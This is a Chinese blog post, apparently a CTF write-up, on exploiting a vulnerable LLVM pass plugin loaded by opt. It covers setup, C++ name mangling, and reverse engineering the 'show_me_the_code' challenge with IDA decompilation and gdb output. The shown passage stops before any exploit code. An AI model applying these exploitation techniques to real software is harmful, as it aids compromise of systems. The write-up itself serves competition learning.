<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="viol1t">





<title>LLVM PASS PWN：使用c++编写exp | viol1t</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">LLVM PASS PWN：使用c++编写exp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十月 31, 2024&nbsp;&nbsp;11:27:53</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/pwn/">pwn</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛中遇到一道<code>llvm pass pwn</code>，现学了一下相关知识，发现网上的讲解和例题的<code>exp</code>基本都是用的<code>c</code>语言，而比赛中的这题在题目描述中说明了用的是<code>c++</code>，虽然用<code>c</code>也可以通过修改<code>.ll</code>文件完成，但是相比之下还是觉得直接用<code>c++</code>写<code>exp</code>方便一些，主要体现在：</p>
<ul>
<li><code>c</code>语言需要导入<code>#include &lt;stdbool.h&gt;</code>头才能使用<code>bool</code>类型</li>
<li><code>c</code>语言没有<code>class</code>，需要先写成<code>struct</code>再修改<code>.ll</code>文件中的<code>struct</code>为<code>class</code>，且使用<code>struct</code>编写本身也比<code>class</code>麻烦</li>
</ul>
<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h3><p><code>llvm</code>的作用：<code>gcc</code>编译时前后端耦合在一起，出现新平台或编译程序都需要重新设计<code>IR</code>，而<code>llvm</code>使用统一的中间代码不需要设计新的<code>IR</code></p>
<p><code>llvm pass</code>：对<code>ir</code>进行分析 优化等操作的过程的模块</p>
<p><code>IR</code>的三种表现形式:</p>
<ul>
<li><code>.ll</code>：可读<code>IR</code>，类似汇编</li>
<li><code>.bc</code>：不可读二进制<code>IR</code></li>
<li>保存在内存中</li>
</ul>
<p><code>llvm</code>工具</p>
<ul>
<li><code>llvm-as</code>：把<code>LLVM IR</code>从人可读的文本格式汇编成成二进制格式</li>
<li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编</li>
<li><code>opt</code>：优化<code>LLVM IR</code>，输出新的<code>LLVM IR</code></li>
<li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码</li>
<li><code>lli</code>：解释执行<code>LLVM IR</code></li>
</ul>
<p>环境配置:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-12 clang-8 llvm-12 llvm-8</span><br></pre></td></tr></table></figure>

<p>程序编译:</p>
<ul>
<li><p>编译为<code>.ll</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang-12 -emit-llvm -S exp.c -o exp.ll</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译为<code>.bc</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang-12 -emit-llvm -c exp.c -o exp.bc</span><br></pre></td></tr></table></figure></li>
</ul>
<p>程序运行:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt-12 -load ./xxx.so -标识符 ./exp.ll</span><br></pre></td></tr></table></figure>

<p>其中标识符与加载的动态库中注册的一个<code>pass</code>相关联，可以使用<code>-标识符</code>来启用这个<code>pass</code></p>
<h3 id="c-函数名修饰规则"><a href="#c-函数名修饰规则" class="headerlink" title="c++函数名修饰规则"></a>c++函数名修饰规则</h3><p>使用<code>gcc</code>或<code>clang</code>编译<code>c++</code>时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：</p>
<ul>
<li><p><code>_Z</code>：修饰名称的开始</p>
</li>
<li><p><code>N</code>：表示这是一个函数或静态成员函数</p>
</li>
<li><p>数字：表示函数名称的长度</p>
</li>
<li><p>类名和函数名：经过编码的类名和函数名</p>
</li>
<li><p><code>E</code>：参数列表的开始</p>
</li>
<li><p>参数类型：通过不同的字母按顺序表示参数类型</p>
<table>
<thead>
<tr>
<th>字母</th>
<th>参数类型</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>int</td>
</tr>
<tr>
<td>j</td>
<td>unsigned int</td>
</tr>
<tr>
<td>l</td>
<td>long</td>
</tr>
<tr>
<td>x</td>
<td>long long</td>
</tr>
<tr>
<td>m</td>
<td>unsigned long</td>
</tr>
<tr>
<td>c</td>
<td>char</td>
</tr>
<tr>
<td>h</td>
<td>unsigned char</td>
</tr>
<tr>
<td>b</td>
<td>bool</td>
</tr>
</tbody></table>
</li>
<li><p>结尾：包含额外信息如返回类型</p>
</li>
</ul>
<p>例如<code>_ZN4edoc4addiEhii</code>表示在<code>edoc</code>类中的函数名长度为<code>4</code>的函数<code>addi</code>，它的三个参数分别是<code>unsigned char</code>、<code>int</code>、<code>int</code>类型</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>题目一般会给出<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、<code>xxx.so</code>和一个说明文档，说明文档会给出如何编译运行以及打远程，一般是将<code>.ll</code>或者<code>.bc</code>文件进行<code>base64</code>编码发送到远程，漏洞点出现在<code>xxx.so</code>，即需要逆向分析的就是这个<code>xxx.so</code>，而攻击的是<code>opt</code>程序，<code>opt</code>程序没给的话也可以用<code>/bin/opt-12</code></p>
<ul>
<li><p>在初始化函数(例如<code>_cxx_global_var_init_17</code>)中找到标识符（即<code>StringRef</code>函数的参数)</p>
</li>
<li><p>导入动态链接库<code>sudo cp xxx.so /lib</code></p>
</li>
<li><p>在<code>xxx.so</code>的<code>.data.rel.ro</code>段找到虚表，虚表的最后一项就是程序入口</p>
</li>
<li><p>进行动态调试，确定入口函数名、其他函数名、类名等</p>
</li>
<li><p>编写交互脚本</p>
</li>
<li><p>逆向分析函数，编写<code>exp</code>脚本</p>
</li>
</ul>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>使用<code>gdb opt-12</code>进行调试，并且通过<code>set args -load ./xxx.so -xxx ./exp.ll</code>导入参数，在<code>main</code>函数下断点，运行至所有<code>llvm::initialize</code>前缀的初始化函数结束，使用<code>vmmap</code>获取<code>xxx.so</code>的基址，通过<code>IDA</code>中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p>题目来源于源鲁杯<code>Round3</code>的困难题，给了<code>codeVM.so</code>、<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、说明文档和<code>docker</code>，给出编译指令<code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code>，上传题解的方式是将<code>exp.ll</code>进行<code>base64</code>编码并且在最后加上换行和<code>EOF</code>发送到远程，从编译指令可以看出需要用<code>c++</code>编写<code>exp</code></p>
<h4 id="确定标识符"><a href="#确定标识符" class="headerlink" title="确定标识符"></a>确定标识符</h4><p>直接搜索函数名<code>init</code>找到函数<code>_cxx_global_var_init_17</code>中有标识符<code>Co00o0oOd3</code>，确定了程序的运行方式是<code>./opt-12 -load ./codeVM.so -Co00o0oOd3 ./exp.ll</code>，这里需要先执行<code>sudo cp codeVM.so /lib</code>导入动态链接库</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _cxx_global_var_init_17()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  llvm::StringRef::StringRef((llvm::StringRef *)&amp;v3, <span class="string">&quot;Co00o0oOd3&quot;</span>);</span><br><span class="line">  llvm::StringRef::StringRef((llvm::StringRef *)&amp;v1, <span class="string">&quot;c0oo0o0Ode Pass&quot;</span>);</span><br><span class="line">  llvm::RegisterPass&lt;`anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode&gt;::RegisterPass((<span class="type">unsigned</span> <span class="type">int</span>)&amp;X, v3, v4, v1, v2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(llvm::RegisterPass&lt;`anonymous namespace<span class="number">&#x27;</span>::c0oo0o0Ode&gt;::~RegisterPass, &amp;X, &amp;_dso_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="确定程序入口函数"><a href="#确定程序入口函数" class="headerlink" title="确定程序入口函数"></a>确定程序入口函数</h4><p>在<code>.data.rel.ro</code>段找到了<code>vtable</code>，最后一项&#96;&#96;anonymous namespace’::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)&#96;就是程序入口，直接点进这个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000030D08                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD2Ev ; `anonymous namespace&#x27;::c0oo0o0Ode::~c0oo0o0Ode()</span><br><span class="line">.data.rel.ro:0000000000030D10                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD0Ev ; `anonymous namespace&#x27;::c0oo0o0Ode::~c0oo0o0Ode()</span><br><span class="line">.data.rel.ro:0000000000030D18                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void)</span><br><span class="line">.data.rel.ro:0000000000030D20                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:0000000000030D28                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">.data.rel.ro:0000000000030D30                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*)</span><br><span class="line">.data.rel.ro:0000000000030D38                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;)</span><br><span class="line">.data.rel.ro:0000000000030D40                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">.data.rel.ro:0000000000030D48                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">.data.rel.ro:0000000000030D50                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void)</span><br><span class="line">.data.rel.ro:0000000000030D58                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">.data.rel.ro:0000000000030D60                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void)</span><br><span class="line">.data.rel.ro:0000000000030D68                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*)</span><br><span class="line">.data.rel.ro:0000000000030D70                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void)</span><br><span class="line">.data.rel.ro:0000000000030D78                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void)</span><br><span class="line">.data.rel.ro:0000000000030D80                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void)</span><br><span class="line">.data.rel.ro:0000000000030D88                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">.data.rel.ro:0000000000030D90                 dq offset _ZN12_GLOBAL__N_110c0oo0o0Ode13runOnFunctionERN4llvm8FunctionE ; `anonymous namespace&#x27;::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)</span><br></pre></td></tr></table></figure>

<h4 id="确定函数名和类名编写交互脚本"><a href="#确定函数名和类名编写交互脚本" class="headerlink" title="确定函数名和类名编写交互脚本"></a>确定函数名和类名编写交互脚本</h4><p>找到程序逻辑，其中<code>llvm::Value::getName</code>用于获取函数名，<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>用于比较函数名</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::c0oo0o0Ode::<span class="built_in">runOnFunction</span>(</span><br><span class="line">        _anonymous_namespace_::c0oo0o0Ode *<span class="keyword">this</span>,</span><br><span class="line">        llvm::Function *a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  _BYTE v5[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  llvm::Value *v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  _anonymous_namespace_::c0oo0o0Ode *v10; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="keyword">this</span>;</span><br><span class="line">  v9 = a2;</span><br><span class="line">  secret::<span class="built_in">init</span>(<span class="keyword">this</span>);</span><br><span class="line">  Name = llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v8 = v2;</span><br><span class="line">  VMDatProt::<span class="built_in">getStrFromProt2</span>(</span><br><span class="line">    (__int64)v5,</span><br><span class="line">    (__int64)&amp;`anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::vmFuncName[abi:cxx11],</span><br><span class="line">    (__int64)&amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  llvm::StringRef::<span class="built_in">StringRef</span>(v6, v5);</span><br><span class="line">  v4 = llvm::<span class="keyword">operator</span>==(Name, v8, v6[<span class="number">0</span>], v6[<span class="number">1</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::c0oo0o0Ode::<span class="built_in">vmRun</span>(<span class="keyword">this</span>, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接随便写一个函数名动态调试，传入参数的指令是<code>set args -load codeVM.so -Co00o0oOd3 exp.ll -f</code>，运行完初始化函数之后通过<code>vmmap</code>找到<code>codeVM.so</code>的基址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff1f88000     0x7ffff1fa0000 r--p    18000      0 /usr/lib/codeVM.so</span><br><span class="line">   0x7ffff1fa0000     0x7ffff1fb0000 r-xp    10000  18000 /usr/lib/codeVM.so</span><br><span class="line">   0x7ffff1fb0000     0x7ffff1fb8000 r--p     8000  28000 /usr/lib/codeVM.so</span><br><span class="line">   0x7ffff1fb8000     0x7ffff1fb9000 r--p     1000  2f000 /usr/lib/codeVM.so</span><br><span class="line">   0x7ffff1fb9000     0x7ffff1fbb000 rw-p     2000  30000 /usr/lib/codeVM.so</span><br></pre></td></tr></table></figure>

<p>在<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>下断点观察函数名，测试程序中我的函数名是<code>testname</code>，在比较时输入的函数名变成了<code>_Z8testnamev</code>，即头部+长度+函数名+<code>v</code>，比较对象函数名<code>_Z10c0deVmMainv</code>，所以入口函数的函数名就是<code>c0deVmMain</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff1fa3242 &lt;(anonymous namespace)::c0oo0o0Ode::runOnFunction(llvm::Function&amp;)+98&gt;     call   llvm::operator==(llvm::StringRef, llvm::StringRef)@plt                &lt;llvm::operator==(llvm::StringRef, llvm::StringRef)@plt&gt;</span><br><span class="line">        rdi: 0x4e5510 ◂— &#x27;_Z8testnamev&#x27;</span><br><span class="line">        rsi: 0xc</span><br><span class="line">        rdx: 0x7fffffffd390 ◂— &#x27;_Z10c0deVmMainv&#x27;</span><br><span class="line">        rcx: 0xf</span><br></pre></td></tr></table></figure>

<p>程序的基本结构如下，其他操作都写在<code>c0deVmMain</code>中</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">c0deVmMain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过比较之后会进入&#96;&#96;anonymous namespace’::c0oo0o0Ode::vmRun(this, v9);<code>，这个函数中存在</code>8<code>个</code>op<code>，在每个</code>op<code>之前通过</code>anonymous namespace’::c0oo0o0Ode::isValidOp(this, &amp;v15, v6) &amp; 1) !&#x3D; 0<code>判定函数名是否符合，同样函数中存在</code>llvm::Value::getName(v12)<code>和</code>llvm::operator&#x3D;&#x3D;(Name, v11, v9[0], v9[1], v4, v5);&#96;，也是任意写一个函数定位到这里判断函数名</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::c0oo0o0Ode::<span class="built_in">isValidOp</span>(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+Fh] [rbp-81h]</span></span><br><span class="line">  _BYTE v8[<span class="number">32</span>]; <span class="comment">// [rsp+18h] [rbp-78h] BYREF</span></span><br><span class="line">  __int64 v9[<span class="number">2</span>]; <span class="comment">// [rsp+38h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 Name; <span class="comment">// [rsp+48h] [rbp-48h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+50h] [rbp-40h]</span></span><br><span class="line">  llvm::Value *v12; <span class="comment">// [rsp+58h] [rbp-38h]</span></span><br><span class="line">  __int64 CalledOperand; <span class="comment">// [rsp+60h] [rbp-30h]</span></span><br><span class="line">  llvm::CallBase *v14; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+8Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v17 = a1;</span><br><span class="line">  v16 = a2;</span><br><span class="line">  v15 = a3;</span><br><span class="line">  v14 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(a2);</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  CalledOperand = llvm::CallBase::<span class="built_in">getCalledOperand</span>(v14);</span><br><span class="line">  v12 = (llvm::Value *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::Function,llvm::Value&gt;(CalledOperand);</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  Name = llvm::Value::<span class="built_in">getName</span>(v12);</span><br><span class="line">  v11 = v3;</span><br><span class="line">  VMDatProt::<span class="built_in">getStrFromProt2</span>((__int64)v8, v15, (__int64)&amp;secret::vmKey[abi:cxx11]);</span><br><span class="line">  llvm::StringRef::<span class="built_in">StringRef</span>(v9, (__int64)v8);</span><br><span class="line">  v7 = llvm::<span class="keyword">operator</span>==(Name, v11, v9[<span class="number">0</span>], v9[<span class="number">1</span>], v4, v5);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="keyword">if</span> ( (v7 &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (`anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::c0oo0o0Ode::<span class="built_in">isValidEnv</span>(a1, v16) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v18 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_6:</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v18 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我的测试函数名是<code>testfunction</code>，运行到断点观察输入函数名变成<code>_Z12testfunctionv</code>，而比较函数名<code>_ZN4edoc4addiEhii</code>，根据<code>c++</code>函数名修饰规则可以分析到该函数是位于<code>edoc</code>类下的<code>addi</code>函数，参数类型是<code>unsigned char</code>、<code>int</code>、<code>int</code> </p>
